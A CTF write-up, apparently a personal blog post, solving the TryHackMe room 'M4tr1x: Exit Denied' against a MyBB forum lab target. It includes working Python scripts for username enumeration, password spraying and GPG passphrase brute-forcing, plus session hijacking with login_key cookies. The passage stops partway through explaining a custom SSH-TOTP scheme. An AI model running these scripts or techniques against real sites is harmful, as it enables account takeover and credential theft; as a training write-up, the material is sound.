---
title: "M4tr1x: Exit Denied"
date: 05-23-2025
excerpt: TryHackMe Writeup
cover: ../uploads/cover_matrix.jpg
tags: MyBB Exploitation, GPG Cracking, SSH-TOTP Bypass
---

In this post, I'll walk you through how I tackled the *M4tr1x: Exit Denied* challenge on TryHackMe. This particular room was a serious test of endurance — it took quite a bit of time and really pushed my patience to the limit. It wasn’t just about technical skill; it required careful observation, trial-and-error, and a lot of persistence. If you're someone who enjoys digging deep and not giving up easily, this one’s for you. Let's dive in and break it down step-by-step.

## Reconnaissance

Let's scan for the open ports for potential entry points using **Nmap**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F3VbiFKDeP0rnMzPBkQhs%252FScreenshot%2520%281116%29.png%3Falt%3Dmedia%26token%3D3591842b-439e-4c71-bd28-4f49f3634fe8&width=768&dpr=3&quality=100&sign=bf91046f&sv=2)

The open ports are 22, 80, and 3306

Let's navigate to the application

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F39aCgTivUrW3X02zz7xD%252FScreenshot%2520%281117%29.png%3Falt%3Dmedia%26token%3D01f84da4-0e74-4b62-aad3-824b60a2f3e6&width=768&dpr=3&quality=100&sign=3e26b7a4&sv=2)

If you'll take a look at the very bottom, you'll see this

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FYNn81bYsmi86HcyQvh80%252FPasted%2520image%252020230125142636.png%3Falt%3Dmedia%26token%3Dd619e922-b0cf-4916-8a31-cd23c32f0b1c&width=768&dpr=3&quality=100&sign=40de1dfe&sv=2)

Upon inspecting the web application, it's clear that it's built using **MyBB (short for MyBulletinBoard)** — an open-source forum software commonly used to create and manage online communities.

MyBB is known for its straightforward interface and a rich set of features that make managing forums easier for administrators while also providing a smooth experience for users. It includes tools such as user registration and profile management, private messaging, thread and post moderation, customizable themes and plugins, and robust administrative controls. These features allow site owners to quickly set up a fully functional bulletin board without extensive coding or configuration.

However, because MyBB is a widely used platform, it has also been a frequent target for attackers. Vulnerabilities in outdated versions — especially related to authentication, file uploads, or plugin exploitation — can often be leveraged in CTF challenges or real-world scenarios. For this reason, identifying that the application is using MyBB is an important first step in reconnaissance, as it helps narrow down the potential attack surface and known exploits to investigate.

## Enumeration

### Directory Enumeration and the /flag, /secret Rabbit Holes

Let's enumerate the subdirectories using **gobuster**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F1KMn6kC7JmlXg3OvZGrX%252FScreenshot%2520%281118%29.png%3Falt%3Dmedia%26token%3Dedd1eeb2-7fcf-41d9-872d-70ac3e90da67&width=768&dpr=3&quality=100&sign=3fd21175&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FmFeeg9IgMWM2uHzG8NFk%252FScreenshot%2520%281119%29.png%3Falt%3Dmedia%26token%3Df2e787d6-80bd-44b8-bbc5-e2d4db3e95f5&width=768&dpr=3&quality=100&sign=7ea5309c&sv=2)

At first glance, the presence of `/flag` and `/secret` directories definitely catches your attention — tempting, right? But here's the thing: you need to be cautious and control that curiosity. In realistic or more advanced **Boot-to-Root (B2R)** challenges, especially the harder ones, it's rarely as simple as stumbling upon a flag just by blindly enumerating subdirectories. These kinds of CTFs are designed to test your methodology, not reward lucky guesses. So while it's good to explore, don't expect the obvious to always lead you straight to the prize.

Here's the content of the two subdirectories

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGlObNVB9xAUAZ83KkJbt%252FScreenshot%2520%281120%29.png%3Falt%3Dmedia%26token%3D729d1d94-30de-45aa-9531-71bb2e11313c&width=768&dpr=3&quality=100&sign=fc13208b&sv=2)

See??

Let's dig deeper!

### Following the White Rabbit to Willis's Profile

In the challenge description, there's a key hint that says: **Follow the white rabbit (Enumerate, Enumerate, Enumerate!)**

Let's take a look back at the Home Page and navigate to the Members page and upon checking, I saw a user with a profile of a white rabbit

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8Zw9JyMZT9x6Dx1ktOQZ%252FScreenshot%2520%281122%29.png%3Falt%3Dmedia%26token%3D9a0cbf35-3633-4d22-b712-351a951dfee5&width=768&dpr=3&quality=100&sign=d6340e89&sv=2)

Follow the white rabbit huh, let's make it literal

I navigate to user Willis's profile and here are the contents:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F3KyPlJzldjnD5TodKkVv%252FScreenshot%2520%281123%29.png%3Falt%3Dmedia%26token%3D3ff032b2-b897-4772-8f99-51b7f1ad8235&width=768&dpr=3&quality=100&sign=30c93ba5&sv=2)

2,200 posts?? Let's take a look

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9MPgPwV51abWssBWX7lL%252FScreenshot%2520%281124%29.png%3Falt%3Dmedia%26token%3D993bc9bc-81f8-4793-9967-fe30f0a8f187&width=768&dpr=3&quality=100&sign=17a866b0&sv=2)

Looks like we need to have an account in order for us to see Willis's posts

### Registering an Account and Discovering /bugbountyHQ

Let's register!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJj07F7J2LM8ud5jlhFhQ%252FScreenshot%2520%281125%29.png%3Falt%3Dmedia%26token%3D8fe4faa5-cd27-4099-b024-b9c706233471&width=768&dpr=3&quality=100&sign=90ec70bc&sv=2)

After successful registration, I was redirected directly in my account.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXRElkYF0GB8Re0b3LZ0F%252FScreenshot%2520%281127%29.png%3Falt%3Dmedia%26token%3D530d79dd-d388-4a21-afb5-1628b830bf62&width=768&dpr=3&quality=100&sign=bfc4adb0&sv=2)

And we saw a 1 post from Willis about Bug Bounty Program, let's take a look.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8bH2sm7F3QvXCHVzLQ0V%252FScreenshot%2520%281128%29.png%3Falt%3Dmedia%26token%3D1a1e645d-4367-4835-952c-bcc08fa7f1d2&width=768&dpr=3&quality=100&sign=14b0538a&sv=2)

A subdirectory named `/bugbountyHQ` is revealed or referenced.

This is the content of the mentioned subdirectory:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FrOFemfh6M2kdlmrtirtK%252FScreenshot%2520%281129%29.png%3Falt%3Dmedia%26token%3Dcf4c1a8a-7ee2-47b5-a86f-1a02715792b4&width=768&dpr=3&quality=100&sign=417bb073&sv=2)

A BBP Report Form

### Reviewing the BBP Report Form and Its Source Code

But the problem here is that I can't type any input. Well, the reason is clear, it's disabled.

When I click submit, it will send a POST request to `/reportPanel.php` .

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FToyMr7gEz5iePztFghKA%252FScreenshot%2520%281130%29.png%3Falt%3Dmedia%26token%3D06df7e92-163f-401c-a14a-123e610d8f9d&width=768&dpr=3&quality=100&sign=ad74e9a8&sv=2)

It's just a table of BBP reports. I've read all the reports and it revealed that some users are using weak password. Gaining control of an administrator-level account at this point would significantly work to our advantage.

Is that all? Let's take a look at the source code, maybe something is hidden here.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbZHqTUt0PObFx5INWR1y%252FScreenshot%2520%281132%29.png%3Falt%3Dmedia%26token%3De12fc456-b027-4d8e-b2b1-88f97cd52619&width=768&dpr=3&quality=100&sign=1bb9bd48&sv=2)

As I thought, there's a hidden message here.

If you take a look, it seems that the binary here is a subdirectory, let's check:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FBlrKCgOHz4iCTnraLdcv%252FScreenshot%2520%281133%29.png%3Falt%3Dmedia%26token%3Ddd686a7b-139f-4a48-828f-c537d3586b68&width=768&dpr=3&quality=100&sign=d8977ba6&sv=2)

Huh??? What's this?

I also attempt to convert the Binary to ASCII and this is the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMso996a7lUYGiIAOEfOv%252FScreenshot%2520%281134%29.png%3Falt%3Dmedia%26token%3D099a3677-054d-4514-ae41-3ce89883371d&width=768&dpr=3&quality=100&sign=5dc241d&sv=2)

That word might be useful, but where??

### Enumerating Users via Predictable UIDs

Upon checking the application, I noticed the URL when I visit a user.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fo1GITL9LUJtrv7ExuPl2%252FScreenshot%2520%281137%29.png%3Falt%3Dmedia%26token%3Dfb4bbda8-2a3d-482a-b7ce-547f1e7d674c&width=768&dpr=3&quality=100&sign=628b2a45&sv=2)

Did you noticed?

The User IDs (UIDs) on this system appear to follow a predictable pattern — they increment by 1 for each new user. This kind of sequential structure creates an opportunity for attackers: it means that by simply iterating through numeric values (e.g., 1, 2, 3, and so on), one can potentially discover all valid user accounts if the application doesn't have protections in place.

This lack of randomness or obfuscation in UID assignment, combined with the absence of proper access controls or error handling, makes **user enumeration** feasible. By observing how the system responds to each UID (e.g., showing user details or different error messages for valid vs invalid IDs), we can confirm which users exist.

With this information, it becomes practical to **automate the enumeration process using a Python script** — cycling through UIDs to gather usernames. Once we have a list of valid usernames, we can move on to **password spraying** — attempting a few common passwords across all accounts in hopes of accessing one without triggering account lockouts.

```python
import requests
from threading import Thread
from time import sleep
from bs4 import BeautifulSoup

def check_user(user_id, base_url):
    response = requests.get(f'{base_url}{user_id}')
    parsed_html = BeautifulSoup(response.text, 'html.parser')

    if 'The member you specified is either invalid or doesn\'t exist.' in parsed_html.get_text():
        return
    else:
        username = parsed_html.title.string[23:]
        output = f'Valid username found - ID: {user_id}, Username: {username}'
        print(output)
        
        with open('valid_users.txt', 'a') as file:
            file.write(f'{output}\n')

def start_scan():
    base_url = 'http://10.10.26.145/member.php?action=profile&uid='
    
    for user_id in range(1, 100):
        thread = Thread(target=check_user, args=(user_id, base_url))
        thread.start()
        sleep(0.02)

if __name__ == "__main__":
    start_scan()
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FU0zU8YVklYW55fi5oXHY%252FScreenshot%2520%281138%29.png%3Falt%3Dmedia%26token%3D53d067b3-f40a-4840-ad92-1902c38b556e&width=768&dpr=3&quality=100&sign=d849d70b&sv=2)

### Password Spraying to Compromise Moderator Accounts

From there, we can begin performing password spraying attack!

```python
import requests
from threading import Thread
from time import sleep
import re

def attempt_login(base_url, user, pwd):
    session = requests.Session()
    
    response = session.get(base_url)
    key_match = re.search(r'var my_post_key = "([0-9a-f]+)";', response.text)
    post_key = key_match.group(1)
    
    login_payload = {
        'username': user,
        'password': pwd,
        'submit': 'Login',
        'action': 'do_login',
        'url': '',
        'my_post_key': post_key
    }
    
    print(f'Attempting login - User: {user:20s}', end='\r')
    
    login_response = session.post(base_url, data=login_payload)
    
    if 'Please correct the following errors before continuing:' not in login_response.text:
        print(f'Valid credentials found - Username: {user}, Password: {pwd}')

def run_bruteforce():
    target_url = 'http://10.10.26.145/member.php'
    passwords = ['password123', 'Password123', 'crabfish', 'linux123', 'secret', 'piggybank', 
                'windowsxp', 'starwars', 'qwerty123', 'qwerty', 'supermario', 'Luisfactor05', 'james123']
    user_file = 'username.txt'
    
    with open(user_file, 'r') as file:
        for line in file:
            username = line.strip()
            for password in passwords:
                thread = Thread(target=attempt_login, args=(target_url, username, password))
                thread.start()
                sleep(0.5)

if __name__ == '__main__':
    run_bruteforce()
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FusehOATue7kleEoAFGYS%252FScreenshot%2520%281139%29.png%3Falt%3Dmedia%26token%3D7ae6f5e2-c288-4ee4-94d8-97d992bc1bbf&width=768&dpr=3&quality=100&sign=84e5b1a7&sv=2)

And two of the users are Moderator, **ArnoldBagger** and **PalacerKing**.

After logging in as ArnoldBagger:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FaN4YlqzTfzX3rcz5NlOG%252FScreenshot%2520%281140%29.png%3Falt%3Dmedia%26token%3D8dd0a508-d22d-4ac9-9ad3-016b868d2f3a&width=768&dpr=3&quality=100&sign=40bedbc3&sv=2)

We are now Arnold!

### Discovering /devBuilds and the Encrypted MySQL Password

I enumerate all the private messages until I found this message:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUvoH0S7masmf2gUA0B2k%252FScreenshot%2520%281143%29.png%3Falt%3Dmedia%26token%3Dc4067b39-0596-48ee-aa45-dad1b2466160&width=768&dpr=3&quality=100&sign=2d62292f&sv=2)

A subdirectory `/devBuilds` was mentioned.

Let's visit:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FReXXInCfPSPVymQUqqCe%252FScreenshot%2520%281144%29.png%3Falt%3Dmedia%26token%3D5bed1a54-cbb8-47f0-b390-fe6a0616d4ec&width=768&dpr=3&quality=100&sign=8aae1afe&sv=2)

So the plugin is **modManagerv2.**

I download the modManagerv2 and the p.txt.gpg

this is the content of modManagerv2.plugin:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FrGHoV3fxpRH7MsG1lxqg%252FScreenshot%2520%281146%29.png%3Falt%3Dmedia%26token%3D43c4ab66-9186-4483-99ee-552d3eeee4e4&width=768&dpr=3&quality=100&sign=9d042d8&sv=2)

It was also revealed that `p.txt.gpg` is an encrypted file containing the MySQL password. Additionally, we discovered a user named **mod**.

I attempt to crack it using gpg2john and john, but I've failed.

I spent quite a bit of time on this part, trying to figure out how to crack it. I kept asking myself — is there a special wordlist I should be using? Is there some kind of twist or trick involved? What exactly am I missing?

## Exploitation

### Cracking the GPG-Encrypted MySQL Password

Until I remember the hidden message in the source code earlier. The sequence of numbers.

I decode it using CyberChef and this is the result:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FY4sfweV64UiV9QgHcocF%252FScreenshot%2520%281147%29.png%3Falt%3Dmedia%26token%3D77900fe3-6851-426a-b6af-0cdd9d7e9b5a&width=768&dpr=3&quality=100&sign=b5a5cf01&sv=2)

a permutation of only the engish letters will open the locks address

Permutation? Wait, let's examine the sequence of chinese characters in the animation and you will see that there's an english alphabet occuring. What I've did is to check the source code of the binary path and I found this:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FBA2T3SCP7Z3Nwgik7j3L%252FScreenshot%2520%281148%29.png%3Falt%3Dmedia%26token%3Da68d39bc-dc70-4015-be96-44e3652fc799&width=768&dpr=3&quality=100&sign=8d9bfb2d&sv=2)

Did you noticed, there's an alphabet! All I did is to collect those alphabets

```text
ofqxvg
```

Maybe we can create a custom GPG password cracker by using the collected letters as a base wordlist, generating all possible combinations or permutations until we eventually find the correct password.

```python
from itertools import permutations
import gnupg

def create_combinations(chars):
    return list(permutations(chars))

def crack_passphrase(combinations, gpg_home, encrypted_file, output_file):
    gpg = gnupg.GPG(gnupghome=gpg_home)

    for combo in combinations:
        passphrase = ''.join(combo)
        print(f'[*] Attempting passphrase: {passphrase}', end='\r')

        with open(encrypted_file, 'rb') as file:
            decryption_result = gpg.decrypt_file(file, passphrase=passphrase, output=output_file)

            if decryption_result.ok:
                print(f'[+] Successful passphrase found: {passphrase}')
                return True

def start_cracking():
    characters = 'ofqxvg'
    combinations = create_combinations(characters)

    gpg_home = '/home/kuroshiro/.gnupg'
    input_file = 'p.txt.gpg'
    output_file = 'decrypted_output.txt'

    crack_passphrase(combinations, gpg_home, input_file, output_file)

if __name__ == '__main__':
    start_cracking()
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F1bS6WF2I8RAc9ReSsGz6%252FScreenshot%2520%281149%29.png%3Falt%3Dmedia%26token%3D84edb852-9e48-409e-a654-7d74c15722eb&width=768&dpr=3&quality=100&sign=241bf01&sv=2)

Here's the output of decrypted\_output.txt

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FFIsTC446aLW7TPMoPDMV%252FScreenshot%2520%281150%29.png%3Falt%3Dmedia%26token%3Dff4b61a2-371f-4a2a-b760-b35571a2a4a3&width=768&dpr=3&quality=100&sign=2deb3b89&sv=2)

### Accessing the Database and Discovering login_key Cookies

Now that we have the password for the database, let's login as user **mod**

```shell
mysql -h <ip> -u mod -p<password>
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fm4nDL4jqgMOY13RXcTU2%252FScreenshot%2520%281151%29.png%3Falt%3Dmedia%26token%3D09f23822-1d73-4c0b-9cc8-2a93d43ae49c&width=768&dpr=3&quality=100&sign=433ad9e5&sv=2)

Upon exploring the database, I saw this table with a bunch of `login_key`!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fm9EY0cG058ywhsTMJ6lS%252FScreenshot%2520%281154%29.png%3Falt%3Dmedia%26token%3D6bfad967-ecdb-482a-9cd3-f78bb3c98cba&width=768&dpr=3&quality=100&sign=1f50958e&sv=2)

I wonder what is Login Key in MyBB

Based on this [documentation](https://docs.mybb.com/1.6/Database-Tables-mybb-users/), it is used to authenticate user's cookies.

Let's take a look at the cookies of our logged in user.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FWWciNm73DcvbMQB7vIox%252FScreenshot%2520%281158%29.png%3Falt%3Dmedia%26token%3Ddb6f4274-d66d-468f-81af-7979e12d7702&width=768&dpr=3&quality=100&sign=a40f3393&sv=2)

it contains the exact same `login_key` that we previously discovered in the MySQL database! On top of that, it also includes a UID, which we've already did earlier while enumerating usernames.

### Hijacking Sessions via Login Key to Become BlackCat

At this point, we can easily hijack to any account!

Upon checking, the user **BlackCat** is also a moderator and it's included in the database. Now, by knowing his UID which is 7, we can use his UID and combine it with his login key to become user **BlackCat.**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FBIsJ95ifel30gtigLK6f%252FScreenshot%2520%281160%29.png%3Falt%3Dmedia%26token%3Df88b4d3e-4d61-4b80-bf41-3a3ad4ca570d&width=768&dpr=3&quality=100&sign=e1f02bf9&sv=2)

all we need to do is to save it and refresh the page.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FuWMtzHkMHKw0bgl1Ct7J%252FScreenshot%2520%281161%29.png%3Falt%3Dmedia%26token%3D7321a1db-d47b-4fd9-8e3e-e42150e77917&width=768&dpr=3&quality=100&sign=e160c635&sv=2)

As you can see here, we are now BlackCat!!

### Uncovering the SSH-TOTP Authentication Scheme

Under BlackCat's Manage Attachments, I found this files:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FdsaUUUWwuY1Y2Zxlc7AA%252FScreenshot%2520%281163%29.png%3Falt%3Dmedia%26token%3Da660db0f-f2d0-400e-95bf-4690f935df10&width=768&dpr=3&quality=100&sign=3aa4faf7&sv=2)

Here's the content of the `Releases.txt` :

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FFxjOwbpZdYFQzGU8ZihH%252FScreenshot%2520%281164%29.png%3Falt%3Dmedia%26token%3D2051c029-f9d3-43e0-af63-59b4e1c6502e&width=768&dpr=3&quality=100&sign=43b5b9d6&sv=2)

Does that mean the OTP token is based on the system’s current time?

`SSH-TOTP documentation.pdf`**:**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZIfxbSYtzBRpIEAfxZD1%252FScreenshot%2520%281165%29.png%3Falt%3Dmedia%26token%3Df0ba6b75-c184-480d-ae2a-47734523277e&width=768&dpr=3&quality=100&sign=3d589312&sv=2)

Here's the `High-Level SSH-TOTP Diagram.png`**:**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FKBgqO8xfFmLPthvNAclI%252FScreenshot%2520%281166%29.png%3Falt%3Dmedia%26token%3D506af7ab-1038-4d22-b5d8-4166712e387b&width=768&dpr=3&quality=100&sign=eb31c49b&sv=2)

This diagram illustrates the OTP (One-Time Password) authentication process between a client and a server, emphasizing time synchronization. Both the client and the server use a **shared secret token** and their **current time** to calculate an OTP code. For successful SSH authentication, the OTP generated by the client must match the one generated by the server. The server relies on a **virtual time simulator**, which can simulate times from various countries (e.g., China, Spain, Russia), and the client must synchronize with this simulated server time. If the OTP codes match, SSH access is granted; if not, access is denied.

### Reverse-Engineering the Custom OTP Algorithm

`Low-Level SSH-TOTP Diagram.png` :

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FTBovnkK3k9RRL7AadDNr%252FScreenshot%2520%281167%29.png%3Falt%3Dmedia%26token%3D4edd8d34-5a6b-4487-a255-718c22ffb375&width=768&dpr=3&quality=100&sign=44bb5a3a&sv=2)

This diagram illustrates a custom SSH one-time password (OTP) generation mechanism based on time synchronization, cryptographic operations, and a shared secret token. At the heart of the process is the **Shared Secret Token (SST)** — a long, unique number known to both the client and the server. This shared secret acts as a seed, ensuring that only parties with the same SST can generate or verify the same OTP.

The system begins by capturing the current virtual times of three simulated locations, referred to as Country A, B, and C. These time values are expressed in a `DDHHMM` format, representing the day, hour, and minute. For example, 24th day at 13:35 is encoded as `241335`. These three timestamps (CA, CB, and CC) are multiplied together to produce a large composite value called the **Computed Time Token (CTT)**. This multiplication step adds entropy and anchors the OTP generation to a precise temporal context, preventing simple time-based predictions.

Once the CTT is calculated, the next phase involves integrating the SST using a bitwise XOR operation. The XOR function combines the CTT and SST to produce an **Unhashed Code (UC)** — a unique numerical fingerprint for this particular 60-second window. This XORing is a critical cryptographic step because it ensures that the final result cannot be derived without the correct SST, even if the time values are known.

